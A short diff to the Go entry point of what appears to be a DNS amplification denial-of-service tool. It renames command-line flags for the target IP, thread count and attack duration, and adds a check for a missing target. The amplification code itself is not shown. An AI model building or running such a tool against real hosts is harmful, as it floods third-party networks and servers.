@@ -11,12 +11,18 @@ import (
 // CLI arguments
 var targetIP = flag.String("target_ip", "", "The IP address of the target of the attack")
 var iface = flag.String("iface", "eth0", "The network interface to use")
-var filename = flag.String("filename", "data/domains.csv", "A csv file with domain names")
-var numThreads = flag.Int("num_threads", 1, "The number of threads to run in parallel")
-var duration = flag.Int("duration", 1, "The duration of the attack in seconds")
+var filename = flag.String("i", "data/sorted.csv", "Input file: a csv file with domain names")
+var numThreads = flag.Int("n", 1, "The number of threads to run in parallel")
+var duration = flag.Int("d", 1, "The duration of the attack in seconds")
 
 func main() {
     flag.Parse()
+    if *targetIP == "" {
+        fmt.Println("Missing target IP")
+        fmt.Println("Usage:")
+        flag.PrintDefaults()
+        return
+    }
     target := net.ParseIP(*targetIP)
     dnsamp.Configure(*iface, target)
     allServers := dnsamp.ReadFile(*filename)
